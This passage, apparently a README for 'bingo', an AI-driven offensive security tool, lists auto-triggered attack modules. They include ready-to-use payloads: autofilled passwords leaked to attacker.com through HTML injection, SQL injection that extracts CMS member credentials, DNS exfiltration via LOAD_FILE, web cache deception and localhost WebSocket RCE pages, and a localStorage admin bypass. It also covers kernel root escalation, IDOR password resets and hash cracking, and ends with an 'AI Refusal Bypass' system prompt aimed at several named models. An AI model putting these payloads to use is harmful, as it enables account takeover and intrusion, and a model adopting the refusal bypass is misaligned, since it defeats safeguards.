| Chrome | Full URL leaked for `<img>`, `<script>`, `<a>`, `<meta>` refresh | Full URL still leaked (Chrome ignores policy on `<meta>`) |
| Firefox | Only `<a>` + `<meta>` refresh leak full URL | Same as no-policy |
| Safari | Only `<a>` + `<meta>` refresh leak full URL | Same as no-policy |

**Chrome is most dangerous** — fills saved credentials regardless of `form action` domain.

**AI auto-trigger conditions** (bingo activates automatically):

| Condition | Detection method |
|-----------|-----------------|
| `login`, `signin`, `auth` in target URL | URL keyword scan |
| Login form (`type=email` + `type=password`) in HTML body | Body analysis |
| GET parameter reflects HTML (any tag rendered) | Active probe with `<b>BINGO_PROBE</b>` |
| CSP `script-src 'none'` detected | Header analysis |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `csp_detected` | `VERIFIED` (response header) | High |
| `login_form_found` | `VERIFIED` (body analysis) | Info |
| `html_injection_found` | `VERIFIED` (payload reflected in response) | High |
| `csp_bypassed_via_html` | `VERIFIED` (strict CSP + injection confirmed) | Critical |
| `referrer_policy_override` | `VERIFIED`/`LIKELY` | High |
| `autofill_steal_exploitable` | `VERIFIED` (full chain confirmed) | Critical |
| `autofill_steal_likely` | `LIKELY` | High |

**Auto-generated PoC (1-click password theft):**

```bash
# Stage 1: Visit this URL as victim (Chrome autofills saved password)
# On form submit, redirected to stage 2 with credentials in URL

http://target.com/?html=
  <form action="/">
    <input type=email name=email />
    <input type=password name=password />
    <input name=html value='/?html=
      <meta name="referrer" content="unsafe-url">
      <meta http-equiv="Refresh" content="0,url=https://attacker.com" />' />
    <input type=submit />
  </form>

# Stage 2 (attacker server receives):
# GET / HTTP/1.1
# Host: attacker.com
# Referer: http://target.com/?email=victim@gmail.com&password=S3cr3tP@ss
```

**CSS full-page variant (1-click anywhere, requires `style-src unsafe-inline`):**

```html
<input type=submit style="position:fixed;top:0;left:0;
  width:100vw;height:100vh;z-index:999999;opacity:0"/>
```
→ Invisible full-page button — victim clicks **anywhere** on the page.

**Requirements:**

1. Reflected HTML injection in any GET parameter (XSS NOT required)
2. Login form on same domain with credentials saved in browser
3. Works with any CSP, including `script-src 'none'; default-src 'none'`

**Remediation (auto-included in report):**
1. **Fix HTML injection at source** — contextually encode all reflected output (HTML Entity encoding)
2. **Force POST on login forms** — never allow `method="GET"` for password fields
3. **Explicit `Referrer-Policy: no-referrer`** — set in HTTP response headers (not just `<meta>`)
4. **Never put credentials in URLs** — GET parameters appear in server logs, proxy logs, browser history
5. **Treat HTML injection as Critical** — even without XSS, it enables credential theft

---

### Ruby Web App Fuzzing Surface Detection — Ruzzy + LibAFL C Extension Attack Surface Mapper (v2.1)

> **Research basis:**  
> Matt Schwager (Trail of Bits)  
> ["Extending Ruzzy with LibAFL"](https://blog.trailofbits.com/2026/04/29/extending-ruzzy-with-libafl/)  
> Published: April 29, 2026 | Ruzzy 0.8.0 released with LibAFL backend support  
> **Skill module:** `RubyLibAFLFuzz` (id: 54)

#### Background

Ruzzy is Trail of Bits' coverage-guided fuzzer for pure Ruby code and Ruby C extensions. Version 0.8.0 introduced support for LibAFL as an alternative to the original LLVM libFuzzer backend.

Key technical insights from the research:

| Issue | Root Cause | Solution Applied |
|-------|-----------|-----------------|
| `.preinit_array` linker error | GNU `ld` does not support `.preinit_array` sections required by LibAFL's `libFuzzer.a` | Switch from GNU `ld` to LLVM `lld` linker |
| Coverage map initialization order | libFuzzer lazily accepts maps; LibAFL requires all maps registered **before** `LLVMFuzzerRunDriver` starts | Pre-require Ruby C extensions before `Ruzzy.fuzz {}` call, not inside the lambda |
| SanitizerCoverage `.init_array` → `.preinit_array` | C extensions register coverage maps via `.init_array` but LibAFL expects `.preinit_array` | Ensured Ruzzy harness loads C extension at startup via `require` outside lambda |

#### What bingo Detects (RubyLibAFLFuzz)

bingo's `RubyLibAFLFuzz` module maps the fuzzing attack surface of Ruby-based web applications:

| Detection Target | C Extension | Fuzz Value |
|-----------------|-------------|------------|
| GraphQL endpoint | `graphql-ruby` / `libgraphqlparser` | **HIGH** — binary parser, complex grammar |
| JSON API endpoints | `oj` / `Oj C extension` | **HIGH** — native JSON parser |
| XML / sitemap endpoints | `nokogiri` / libxml2 | **HIGH** — XML parser with DTD support |
| MessagePack binary endpoints | `msgpack-ruby C extension` | **HIGH** — binary protocol |
| Protobuf endpoints | `google-protobuf C extension` | **HIGH** — binary protocol |
| File upload + image processing | `RMagick` / `MiniMagick` / ImageMagick | **HIGH** — image format parser |
| YAML deserialization endpoints | `Psych C extension` | **HIGH** — unsafe object deserialization risk |
| Form / URL-encoded data | `Rack` / URI C parser | **MEDIUM** |

#### AI Auto-Trigger Conditions

The module activates automatically when bingo's AI detects:

- `Server:` header contains `Passenger`, `Puma`, `Unicorn`, `Thin`, or `WEBrick`
- `X-Powered-By:` header contains `Phusion Passenger` or `Rack`
- Response cookies contain `_session_id` or `rack.session`
- Response body contains Ruby stack traces (`ActionController::`, `ActiveRecord::`, `.rb:` paths)
- URL matches known Ruby CMS patterns: `redmine`, `gitlab`, `discourse`, `spree`, `solidus`, `refinery`
- `raw_findings` from earlier phases contain Ruby framework keywords

#### Generated Ruzzy + LibAFL Harness Examples

bingo automatically generates harness templates for discovered surfaces:

**GraphQL (libgraphqlparser C extension):**
```ruby
# FUZZER_NO_MAIN_LIB=/usr/lib/libFuzzer.a LD=lld ruzzy fuzz harness.rb
require 'graphql'   # pre-require BEFORE fuzz() — registers .preinit_array coverage map

Ruzzy.fuzz do |data|
  begin
    GraphQL.parse(data.to_s)
  rescue GraphQL::ParseError
    # expected parse errors — only crashes matter
  end
end
```

**Nokogiri XML (libxml2 C extension):**
```ruby
require 'nokogiri'

Ruzzy.fuzz do |data|
  begin
    Nokogiri::XML(data.to_s) { |c| c.strict }
  rescue Nokogiri::XML::SyntaxError
  end
end
```

**YAML unsafe load risk detection:**
```ruby
# Risk: Psych.load enables Ruby object deserialization → RCE via !!ruby/object
# Detection payload:
# --- !!ruby/object:Gem::Installer 'a'
require 'psych'

Ruzzy.fuzz do |data|
  begin
    Psych.safe_load(data.to_s)   # use safe_load in production!
  rescue Psych::SyntaxError
  end
end
```

#### Evidence Levels

| Level | Meaning |
|-------|---------|
| `VERIFIED` | Ruby framework confirmed + C extension parser endpoint responded 200/201 + version leaked |
| `LIKELY` | Ruby framework confirmed + parser endpoints found (no version confirmation) |
| `INFERRED` | Ruby HTTP headers detected, no parser surface confirmed |
| `AI_ANALYSIS` | Response patterns suggest Ruby, no definitive HTTP-level confirmation |

#### Key Takeaway: LibAFL vs. libFuzzer

- **libFuzzer** (LLVM): In maintenance mode as of 2025, expects coverage maps lazily
- **LibAFL** (Rust-based): Actively maintained, better performance, expects all coverage maps registered at startup via `.preinit_array`
- **Migration requirement**: Switch to `lld` linker; pre-require all C extensions before `Ruzzy.fuzz {}`

#### Quick Remediation

```bash
# 1. Set YAML to always use safe_load
grep -r "YAML.load\b" app/ lib/   # find unsafe calls
# Replace: YAML.load → YAML.safe_load

# 2. Enable Brakeman SAST for Ruby
gem install brakeman
brakeman --run-all-checks

# 3. Update vulnerable gems
bundle audit check --update
bundle update nokogiri oj graphql msgpack google-protobuf

# 4. Run Ruzzy+LibAFL with lld
FUZZER_NO_MAIN_LIB=/usr/lib/libFuzzer.a LD=lld bundle exec ruzzy fuzz harness.rb

# 5. Remove framework version from headers (Rails)
# config/application.rb
config.action_dispatch.default_headers = { 'Server' => 'nginx' }
```

---

### Copy Fail LPE — CVE-2026-31431 Linux Kernel Local Privilege Escalation + Container Escape (v2.1)

> **Research basis:**  
> Xint Code Research Team — Juno Im (@junorouse) & Taeyang Lee of Theori  
> ["Copy Fail: 732 Bytes to Root on Every Major Linux Distribution"](https://xint.io/blog/copy-fail-linux-distributions)  
> Published: April 29, 2026 | CVE assigned: April 22, 2026  
> **Skill module:** `CopyFailLPE` (id: 53)

#### What the vulnerability is

A **logic bug in the Linux kernel's `authencesn` cryptographic template** allows any unprivileged local user to perform a **controlled 4-byte write into the kernel page cache of any readable file** — including SUID binaries like `/usr/bin/su`. By chaining four write primitives of 4 bytes each, an attacker overwrites the in-memory copy of a setuid binary with shellcode. When the binary is next executed, the page cache version runs: **instant root** without file-system traces.

Three commits over a decade created the conditions:

| Year | Commit | Effect |
|------|--------|--------|
| 2011 | authencesn added | uses dst scatterlist as ESN scratch space |
| 2015 | AF_ALG AEAD interface | assoclen+cryptlen byte offset past output |
| 2017 | algif_aead in-place optimization | `req->src = req->dst` — page-cache pages now writable |

**Attack chain (732 bytes of Python 3.10+):**
```
AF_ALG socket (authencesn) → splice() target SUID binary into TX scatterlist
→ sendmsg() AAD bytes[4:7] = desired 4-byte shellcode chunk (seqno_lo)
→ recvmsg() → HMAC fails, 4-byte write persists in page cache
→ Repeat per chunk → execve("/usr/bin/su") → root
```

**Why it's stealthy:**
- On-disk file unchanged — SHA256/MD5 file integrity checks **miss** the modification
- Page cache is **host-wide** — works across container and K8s boundaries
- No race condition, no recompile, no crash-prone timing window

#### Affected systems

| Distribution | Vulnerable kernel | Patched kernel |
|---|---|---|
| Ubuntu (tested) | 6.17.0-1007-aws | ≥ 6.17.0-1008 |
| Amazon Linux 2023 | 6.18.8-9 | ≥ 6.18.8-10 |
| RHEL 10.1 | 6.12.0-124 | ≥ 6.12.0-125 |
| SUSE 16 | 6.12.0-160000 | ≥ 6.12.0-160001 |

Broad vulnerable range: **Linux 4.9 (2017 in-place optimization) through distro patch date (2026-04-01)**.

#### What bingo detects

| Detection method | Evidence level |
|---|---|
| Kernel version leaked in HTTP headers (`Server`, `X-Powered-By`) | `LIKELY` |
| `/proc/version` direct path exposure | `VERIFIED` |
| Webshell `uname -r` output in vulnerable range | `VERIFIED` |
| `lsmod \| grep algif_aead` confirms module loaded | `VERIFIED` |
| Python 3.10+ available (PoC can run directly) | `VERIFIED` |
| Container/K8s cgroup markers → host escape path | `VERIFIED` |
| Linux OS hint in headers (no version) | `AI_ANALYSIS` |

#### AI auto-trigger conditions

bingo activates `CopyFailLPE` when **any** of:
- RCE / webshell was confirmed in earlier phase (`result.webshell_uploaded = True`)
- `raw_findings` contains `rce`, `webshell`, `upload`, `command_exec`, or `lfi`
- HTTP response headers contain Linux distribution signatures
- Any header value matches `Linux/x.y` kernel version pattern
- URL path suggests Linux-hosted CMS (gnuboard, WordPress, Drupal, XE, Rhymix)

#### Container escape (Part 2)

Because the Linux page cache is **shared across the host**, a webshell inside a Docker container or K8s pod can run the PoC to overwrite a SUID binary on the **host** node, then escalate to host root outside the container boundary. bingo flags `container_escape_possible = True` when both `kernel_vulnerable` and `container_environment` are `True`.

#### Quick remediation

```bash
# Immediate: disable algif_aead module
sudo rmmod algif_aead
echo 'install algif_aead /bin/false' | sudo tee /etc/modprobe.d/disable-algif-aead.conf
sudo dracut -f  # regenerate initramfs

# Audit AF_ALG socket usage
ss -xlp | grep AF_ALG
auditctl -a always,exit -F arch=b64 -S socket -F a0=38 -k af_alg_socket_call

# Permanent fix: patch kernel (distro-specific)
apt-get upgrade linux-image-$(uname -r)   # Ubuntu
yum update kernel                          # Amazon Linux / RHEL
zypper patch                               # SUSE
```

**Note:** On-disk integrity tools (AIDE, Tripwire, sha256sum) will **not** detect this attack because only the page cache is modified. Runtime memory integrity monitoring or kernel patching is required.

---

### Advanced SQLi Exploit — EXTRACTVALUE Error-Based + Second-Order SQLi (v2.1)

> **Research basis:**  
> [Intigriti — "Exploiting SQL Injection Vulnerabilities: Advanced Exploitation Guide"](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-sql-injection-sqli-vulnerabilities)  
> Published: April 30, 2026 (Updated June 10, 2026) — Author: Ayoub, Intigriti Senior Security Content Developer  
> **Skill module:** `AdvancedSQLiExploit` (id: 52)

#### New techniques beyond standard SQLi automation

Two advanced exploitation techniques not covered by standard `sqlmap` delegation:

**① EXTRACTVALUE Error-Based Exfiltration**

Forces MySQL to throw an XPATH syntax error containing subquery output:

```sql
-- Extract current database name via error message
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))

-- Extract credentials from Korean CMS member table
1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(mb_id,0x3a,mb_password) FROM g5_member LIMIT 1)))

-- CAST overflow fallback (when EXTRACTVALUE is filtered)
1 AND EXP(~(SELECT * FROM (SELECT database()) x))
```

Response contains: `XPATH syntax error: '~target_database_name'` — direct data exfiltration without UNION or reflection.

**② Second-Order (Stored) SQLi Detection**

Input passes initial sanitization and is stored safely, but fires in a deferred async context:

```
Step 1: Store malicious payload in note/username/profile field
         content = "test' AND SLEEP(7)-- -"

Step 2: Trigger async action (email notification / scheduled reminder / export / report)

Step 3: Measure time-gap between scheduled execution time and actual response
         → 7-second delay in background job confirms second-order SQLi
```

**③ OOB DNS Exfiltration via LOAD_FILE**

```sql
-- Exfiltrate data via DNS lookup to attacker-controlled domain
(SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\x')))
```

#### Attack Surface Coverage

| Target | Parameters Tested |
|--------|------------------|
| `/bbs/board.php` | `bo_table`, `wr_id` |
| `/shop/item.php` | `it_id` |
| `/product/view.php` | `idx` |
| `/board/view.php` | `idx` |
| URL query string | All `?key=val` parameters |

#### AI Auto-Trigger Conditions

```python
# Activate AdvancedSQLiExploit when:
sqli_vulnerable == True          # prior SQLi scan confirmed injectable parameter
OR parsed.query != ""            # URL contains query string parameters
OR "board.php"/"view.php" in URL # Korean CMS CMS URL pattern detected
OR "sqli"/"inject" in raw_findings  # SQLi indicators from prior scans
```

#### Second-Order Async Context Detection

Automatically flags pages containing these indicators as potential second-order surfaces:
`reminder` · `notification` · `scheduled` · `background job` · `email send` · `export` · `report` · `queue` · `batch` · `cron` · `task` · `async`

#### EXTRACTVALUE Error Pattern Matched

```
XPATH syntax error: '~<extracted_value>'
```

Regex: `XPATH syntax error.*?'~([^'<]{1,200})'`

#### Evidence Levels

| Finding Type | Evidence Level | Condition |
|---|---|---|
| `error_based_extractvalue` | `VERIFIED` | XPATH error contains extracted data |
| `time_based` | `LIKELY` | Response delay ≥ 85% of SLEEP() value |
| `second_order` | `INFERRED` | Async contexts found in HTML |
| `oob_dns` | `VERIFIED` | DNS callback received |

#### Remediation

1. **All SQL queries** → Prepared Statements / Parameterized Queries mandatory
2. **Error messages** → `display_errors=Off`; never expose XPATH/DB errors to client
3. **Second-order paths** → Treat DB-retrieved data as untrusted when reused in queries
4. **EXTRACTVALUE/SLEEP** → WAF rules blocking `EXTRACTVALUE`, `CONCAT(0x7e`, `SLEEP(`
5. **LOAD_FILE** → `REVOKE FILE ON *.* FROM 'user'@'host'`; DB server egress filtering
6. **Async jobs** → Security audit all background job / cron / email-trigger code paths

---

### Cloud Token Recon — Grafana → GCP Token → 507 Private Repos Chain (v2.1)

> **Research basis:**  
> [Sectricity Security Team — "From a Misconfigured Grafana to 507 Private Meta Repos: A Bug Worth $157K"](https://sectricity.com/blog/misconfigured-grafana-507-private-meta-repos/)  
> Published: May 28, 2026 — **$157,000 bounty** awarded by Meta (filed March 21, mitigated March 23, 2026)  
> **Skill module:** `CloudTokenRecon` (id: 51)

**Key insight:**

A boring open Grafana on a public Meta IP became a 5-hop chain into **507 private Meta repositories** with read/write access. The pivot was not the Grafana content itself — it was the anomaly of its existence. The TLS wildcard SAN on the same IP revealed a hidden shadow domain estate, JS bundles on those domains referenced an undocumented internal API domain, and AI-generated context-aware fuzzing against that domain hit an **unauthenticated GCP token endpoint** — handing out a cloud credential that cascaded through Secret Manager → Vercel → GitHub PATs.

**Attack Chain:**

```
① Open dev tool (Grafana/Prometheus/Kibana) found on public IP
② TLS certificate SAN wildcard → shadow subdomain estate (crt.sh)
③ JS bundle parsing across shadow domains → hidden domain reference discovered
④ Context-aware fuzzing → /_api/gcp-token returns GCP OAuth2 token (no auth)
⑤ GCP token → Secret Manager → Vercel token → 85 env vars → GitHub PATs
⑥ GitHub PATs → 507 private repos with read/write access
```

**Chain table:**

| Hop | Asset Gained | Method |
|-----|-------------|--------|
| 1 | Open dev tool | Public IP scan |
| 2 | Shadow subdomains | TLS SAN wildcard + crt.sh |
| 3 | Hidden internal domain | JS bundle parsing |
| 4 | GCP OAuth2 token | Unauthenticated endpoint fuzz |
| 5 | GitHub PATs | GCP → Secret Manager → Vercel |
| 6 | 507 private repos | GitHub token enumeration |

**AI auto-trigger conditions:**

| Condition | Trigger |
|-----------|---------|
| Target URL contains cloud keywords (aws/gcp/azure/k8s/llm/ai) | ✅ Auto |
| Target URL contains dev tool keywords (grafana/prometheus/jenkins) | ✅ Auto |
| HTTPS target (TLS SAN extraction always valuable) | ✅ Auto |
| HTTP-only target with no cloud indicators | ⏭ Skip |

**What bingo detects:**

| Finding type | Evidence level | Severity |
|-------------|---------------|---------|
| `open_dev_tool` | VERIFIED | Medium |
| `tls_san_wildcard` | VERIFIED | Info |
| `js_hidden_domain` | INFERRED | Low |
| `cloud_token_exposed` | VERIFIED | **Critical** |
| `shadow_domain_token_exposed` | VERIFIED | **Critical** |
| `likely_cloud_chain` | AI_ANALYSIS | High |

**Supported unauthenticated token endpoint patterns:**

```
/_api/gcp-token          /api/gcp-token        /_api/token
/_aws/credentials        /api/aws-token        /api/azure-token
/api/env                 /api/config           /.env
/config.json             /secrets              /debug/token
```

**Token type auto-identification:**

- `gcp_access_token` — GCP OAuth2 `access_token` JSON field
- `aws_access_key` — `ASIA` / `AKIA` prefix AWS credentials
- `github_token` — `ghp_` / `github_pat_` prefix
- `jwt_token` — 3-part dot-separated base64url
- `api_key_generic` — JSON keys named `api_key`, `secret`, `token`

**Remediation:**

1. Require authentication on all internal dev tools (Grafana, Prometheus, Kibana, Jenkins)
2. Never expose internal monitoring services to the public internet — enforce VPN / IP allowlist
3. Minimize TLS wildcard SAN scope; monitor crt.sh for unexpected subdomains
4. Remove internal domain references from production JS bundles — use environment variables
5. Apply IMDSv2 / iptables to block direct cloud metadata access (169.254.169.254)
6. Immediately rotate all exposed cloud credentials (GCP SA → Vercel → GitHub PATs)
7. Enforce least-privilege on service accounts — no full Secret Manager read access

---

### Web Cache Deception + SameSite Lax Bypass (v2.1)

> **Research basis:**  
> [Clement Osei-Somuah (tinopreter) — "Cracking SameSite for a $2,000 Web Cache Deception"](https://medium.com/@tinopreter/cracking-samesite-for-a-2-000-web-cache-deception-746972278412)  
> Published: May 29, 2026 — $2,000 bounty on HackerOne  
> **Skill module:** `WebCacheDeception` (id: 50)

**Key insight:**

Web Cache Deception (WCD) tricks a CDN or reverse proxy into caching a page containing **user-specific sensitive data** (JWT, PII, session token), then an attacker retrieves the cached response without authentication.

The classic attack requires the victim's browser to send their **session cookie** to the target — normally blocked by `SameSite=Lax`. The bypass: use `<meta http-equiv="refresh">` on an attacker-hosted page, which the browser treats as a **top-level navigation**. `SameSite=Lax` cookies **are** sent on top-level navigation by design.

**Attack chain:**

```
① Attacker identifies a page with:
   - No Cache-Control: private / no-store
   - X-Cache / CF-Cache-Status / Age header → CDN active
   - Sensitive data in response (JWT, email, user ID)

② Attacker crafts a unique cache-buster URL:
   https://target.com/profile?cb=ATTACKER_UNIQUE

③ Attacker-hosted page delivers meta-refresh:
   <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=ATTACKER_UNIQUE">
   ↳ Browser performs top-level navigation → SameSite=Lax cookies included

④ Victim visits attacker's page (1-click or embedded):
   - Victim's authenticated response cached at target.com/profile?cb=ATTACKER_UNIQUE

⑤ Attacker fetches same URL (no auth):
   curl https://target.com/profile?cb=ATTACKER_UNIQUE
   ↳ Gets victim's cached response containing JWT/session token

⑥ Attacker uses stolen JWT to impersonate victim → Account Takeover
```

**SameSite bypass detail:**

| Request type | SameSite=Lax | SameSite=Strict |
|---|---|---|
| `<img src=...>` (subresource) | ❌ Blocked | ❌ Blocked |
| `fetch()` / XHR (AJAX) | ❌ Blocked | ❌ Blocked |
| `<a href=...>` link click | ✅ Allowed | ❌ Blocked |
| `<meta http-equiv="refresh">` | ✅ **Allowed** ← bypass | ❌ Blocked |
| Browser address bar navigation | ✅ Allowed | ❌ Blocked |

**`<meta http-equiv="refresh">` = top-level navigation → SameSite=Lax cookies are sent**

**AI auto-trigger conditions** (bingo activates automatically):

| Condition | Detection method |
|---|---|
| `X-Cache`, `CF-Cache-Status`, `Age` header present | HTTP response header analysis |
| CDN keywords in headers (`cloudflare`, `fastly`, `varnish`) | Header fingerprinting |
| Cache-Control missing `private` or `no-store` | Header analysis |
| Web target (any `http://` or `https://`) | Default attempt for all web targets |

**Cache confirmation test** (MISS → HIT):

```bash
# First request (MISS expected):
curl -I "https://target.com/profile?cb=abc123"
# X-Cache: MISS

# Wait 1 second, same URL:
curl -I "https://target.com/profile?cb=abc123"
# X-Cache: HIT  ← caching confirmed
```

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---|---|---|
| `cache_header_detected` | `VERIFIED` (response header) | Info |
| `cacheable_without_private` | `VERIFIED` (header analysis) | Medium |
| `sensitive_data_in_cache` | `VERIFIED` (body analysis: JWT/token/email found) | High |
| `cache_confirmed_miss_to_hit` | `VERIFIED` (two-request confirmation) | High |
| `samesite_lax_bypass_possible` | `VERIFIED` (cookie attribute) | High |
| `wcd_exploitable` | `VERIFIED` (all conditions confirmed) | Critical |
| `wcd_likely` | `LIKELY` (cache confirmed, manual auth test needed) | High |
| `sensitive_path_cacheable` | `LIKELY` (/profile /settings /dashboard) | High |

**Auto-generated PoC HTML:**

```html
<!DOCTYPE html>
<html>
<head>
    <!-- SameSite=Lax Bypass: meta-refresh = Top-Level Navigation
         Browser includes Lax cookies on top-level navigation by spec -->
    <meta http-equiv="refresh" content="0; url=https://target.com/profile?cb=UNIQUE">
</head>
<body>
    <h3>Loading...</h3>
    <!-- Fallback anchor -->
    <a href="https://target.com/profile?cb=UNIQUE">Click here</a>
</body>
</html>
```

**Requirements:**

1. Target page served through CDN/caching proxy (Cloudflare, Fastly, Varnish, Nginx, etc.)
2. Page lacks `Cache-Control: private` or `no-store`
3. Sensitive data (JWT, session, PII) present in response body
4. `SameSite=Lax` or unset (browser default) — does NOT work with `SameSite=Strict`

**Remediation (auto-included in report):**
1. **Add `Cache-Control: no-store, private`** to all authenticated/user-specific responses
2. **Upgrade `SameSite=Strict`** on session cookies — prevents all cross-site cookie delivery
3. **Purge CDN cache** immediately for affected paths
4. **Configure CDN to never cache** paths with `Set-Cookie` in response headers
5. **Add `Vary: Cookie`** header to ensure per-user cache separation
6. **Automated cache header CI check** — flag any authenticated endpoint missing `private`

---

### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)

> **Research basis:**  
> [Yashar Shahinzadeh / Voorivex Team — "First RCE via Reverse Engineering with AI"](https://blog.voorivex.team/first-rce-via-reverse-engineering-with-ai)  
> Similar prior art: Tavis Ormandy (Electrum WebSocket RCE, 2018)

**Attack chain:**

```
① EXE download path extracted from JS → file accessible without auth
② JS contains ws://127.0.0.1:PORT → desktop app runs local WebSocket server
③ WebSocket has no Origin header validation → CSWSH (Cross-Site WebSocket Hijacking)
④ WebSocket exposes RCE gadget: {RUN: "DRIVE", URL: "calc.exe"}
    └── Service falls through to explorer.exe ShellExecute → OS-level code execution
⑤ Zero-click: victim visits attacker page → instant RCE
```

**AI auto-trigger conditions** (bingo runs this scan automatically):

| Condition | Detection method |
|-----------|-----------------|
| `ws://127.0.0.1:PORT` in JS files | JS static analysis |
| EXE download function in JS (`downSetup`, `down=service`) | Regex pattern match |
| `Content-Type: application/octet-stream` response | HTTP probe |
| `download/setup/install` JS functions | Keyword scan |

**Finding types and evidence levels:**

| Finding | Evidence Level | Severity |
|---------|---------------|----------|
| `js_exe_download` | `LIKELY` | Medium |
| `js_localhost_websocket` | `LIKELY` | High |
| `cswsh_port_open` | `VERIFIED` (TCP connect) | Critical |
| `exe_exposed` | `VERIFIED` (HTTP 200 + octet-stream) | High |
| `cswsh_rce_chain` | `LIKELY`/`VERIFIED` | Critical |

**Auto-generated PoC:**

```html
<!-- CSWSH PoC — victim opens this page → RCE triggers automatically -->
<script>
var ws = new WebSocket('ws://127.0.0.1:PORT');
ws.onopen = function() {
  ws.send(JSON.stringify({GET: 'VERSION'}));             // confirm service
  ws.send(JSON.stringify({RUN: 'DRIVE', URL: 'calc.exe'})); // RCE gadget
};
</script>
```

> **Note (Zero-Hallucination):**  
> Server-side scanners cannot connect to `ws://127.0.0.1` — JS pattern detection is `LIKELY`.  
> TCP port open = `VERIFIED`. Browser-based PoC required for final confirmation.

**Remediation (auto-included in report):**
1. Implement Origin header validation in localhost WebSocket server — whitelist approach
2. Remove file/process execution methods from WebSocket API (`RUN/DRIVE`, `RUN/APP`)
3. Add authentication token requirement to WebSocket handshake
4. Require authentication for EXE download endpoints (signed URLs or session check)
5. Replace `explorer.exe` ShellExecute fallback with strict path whitelist

---

### ACPV — Client-Side Authentication Bypass (v2.1)

bingo automatically detects and exploits client-side authentication vulnerabilities — no password needed.

**How it works:**

Many sites store authentication state in the browser (`localStorage`, `sessionStorage`) and never verify it server-side. bingo finds and exploits this pattern automatically.

| Step | What bingo does |
|------|----------------|
| 1 | Collects all JS files from the target and scans for auth-related patterns (`isLoggedIn`, `token`, `userRole`, etc.) |
| 2 | Tests API endpoints without any cookies or tokens — if the server responds 200, it's an unauthenticated API |
| 3 | Identifies Burp Suite response manipulation points (`"isActive":false`, `"role":"user"`, etc.) |
| 4 | Auto-generates browser console PoC — paste and run, no tools needed |

**Example PoC output:**
```javascript
// bingo auto-generated PoC — paste into browser DevTools console
localStorage.setItem('isLoggedIn', 'true');
localStorage.setItem('userRole', 'admin');
localStorage.setItem('token', 'bypass_acpv');
location.reload();
```

**AI auto-trigger conditions:**
- Admin login fails (no password → try client-side bypass)
- No SQLi vulnerability found (pivot to client-side attack)
- React / Vue / Angular site detected (JS-heavy apps are most vulnerable)

**Zero-Hallucination:** Actual HTTP responses are labeled `VERIFIED`. Pattern matches without server confirmation are labeled `LIKELY`. Nothing is fabricated.

---

### IDOR / Authorization Bypass Phase

Based on real-world exploitation experience:

- Scans for insecure direct object references (`?id=`, `?no=`, `?user_id=`)
- Detects PII exposure (resident number, bank account, phone numbers)
- Checks for unauthenticated admin panel access
- Probes `phpinfo()` and sensitive file exposure
- **IDOR-based password reset** — resets credentials via vulnerable endpoints and verifies actual login success
- All findings tagged with evidence level

---

### Hash Cracking — Smart Detection with False-Positive Filter

When password hashes appear in AI responses, bingo automatically triggers a crack pipeline.

**Context-Aware Hash Filter (new in v2.2.3 → v2.2.5)**

Not every 32-character hex string is a password hash. HTTP error pages, tracking IDs, transaction codes, and other identifiers share the same hexadecimal pattern as MD5/NTLM hashes. bingo now automatically detects and skips these false positives before wasting time on crack attempts.

| Filter Rule | Example Trigger |
|-------------|-----------------|
| Error-code keywords in context | `"오류 코드 94B1FB7E..."`, `"error code A3F2..."` |
| HTTP 4xx / 5xx response context | `"400 페이지에 오류코드 ..."` |
| Mixed-case hex without hash signal | `94B1FB7E4E69B3844895...` (alternating upper/lower) |
| Prefix pattern match | `code=`, `id=`, `ref=`, `trace=`, `err=` |

**Always treated as real hashes (bypass filter):** `$2y$…` (bcrypt), `$1$…` (md5crypt), `$6$…` (sha512crypt), `*hex` (MySQL41), or any hex with explicit `password hash:` / `ntlm hash:` context.

To disable the filter for a single session: use `/crack <hash>` directly, or call `extract_hashes_from_text(text, strict=False)` in Python.

When the filter skips candidates, a dim notice appears:
```
🔍 False-positive filter: 1 hex string(s) skipped (error code / tracking ID detected)
```

---

When password hashes appear in AI responses, bingo automatically triggers a crack pipeline:

**Step 1 — Online Lookup** (fast, no GPU needed):

| Site | Notes |
|------|-------|
| CrackStation | Largest free DB |
| hashes.com | Multi-algorithm |
| md5decrypt.net | MD5 specialist |
| nivaura.com | SHA-1 / MD5 |
| cmd5.org | Asia-friendly |

**Step 2 — Offline Crack** (if online fails):
- `john` (John the Ripper)
- `hashcat` (GPU-accelerated, bcrypt)
- Python wordlist engine (rockyou.txt auto-detected)

Supported: `bcrypt`, `MD5`, `SHA-1`, `SHA-256`, `SHA-512`, `NTLM`, `MySQL41`

---

### External Tool Auto-Install & Python Fallback

bingo manages all external tools automatically — no manual setup required.

**Tool execution priority:**

| Step | Action |
|------|--------|
| 1 | Use `~/.bingo/tools/` or system PATH |
| 2 | **Auto-install** (GitHub Releases / brew / apt) |
| 3 | **AI-generated Python** — AI writes the tool itself; workflow never stops |

**Go binary tools** (auto-downloaded from GitHub Releases → `~/.bingo/tools/`):

| Tool | Purpose |
|------|---------|
| `nuclei` | Vulnerability scanning |
| `httpx` | HTTP probing & tech detection |
| `ffuf` | Directory & parameter fuzzing |
| `gobuster` | Directory brute-force |
| `subfinder` | Subdomain enumeration |
| `amass` | Attack surface mapping |

**Package manager tools** (brew / apt / yum auto-install):

| Tool | Purpose | Fallback |
|------|---------|---------|
| `nmap` | Port scan | AI writes Python socket scan |
| `nikto` | Web vuln scan | AI writes Python vuln check |
| `whatweb` | Tech fingerprint | bingo http_probe |

---

### Session Auto-Save

Every chat session is automatically saved to:
```
~/.config/bingo/sessions/session_YYYYMMDD_HHMMSS.md
```
Full AI responses, commands, and results are logged in real time.

---

### Skill Engine

220+ red team skills across 41 modules — automatically injected into AI context based on your input. Use `/skill <keyword>` to search.

**Modules include:** Reconnaissance, Exploitation, Privilege Escalation, Post-Exploitation, Lateral Movement, Persistence, Cloud Security, Mobile Security, LLM/AI Security, Blockchain/Web3, Ransomware Defense, **Client-Side Auth Bypass (ACPV)**, **API Discovery & AI Fuzzing**, **MSSQL 2025 AI Exploitation**, and more.

---

### AI Refusal Bypass

All models (DeepSeek, Claude, GPT, GLM) are guided by a proprietary universal system prompt that enforces:
- Structured task execution with semantic delimiters
